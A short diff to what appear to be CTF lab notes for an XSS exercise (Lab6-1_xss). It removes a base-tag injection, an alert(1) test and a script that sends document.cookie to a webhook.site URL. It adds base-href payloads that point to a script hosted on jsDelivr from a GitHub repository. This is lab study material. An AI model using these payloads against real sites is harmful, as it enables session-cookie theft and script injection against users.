@@ -119,12 +119,8 @@
 
 
 ```js
-<base href="https://webhook.site/ee6ce1e6-6618-4b83-8bc4-ec01d7013bfd">
-<script>alert(1)</script>
+<base href="https://cdn.jsdelivr.net/gh/<GitHub帳號>/<Repository>@<Branch>/<檔案路徑>">
 
+<base href="https://cdn.jsdelivr.net/gh/AnHsiL/ESU-CTF-2026@main/W6Lab-web/Lab6-1_xss/static/script.js">
 
-";
-<script>
-window.location = "https://webhook.site/ee6ce1e6-6618-4b83-8bc4-ec01d7013bfd?aaa="+btoa(document.cookie)
-</script>
 ```
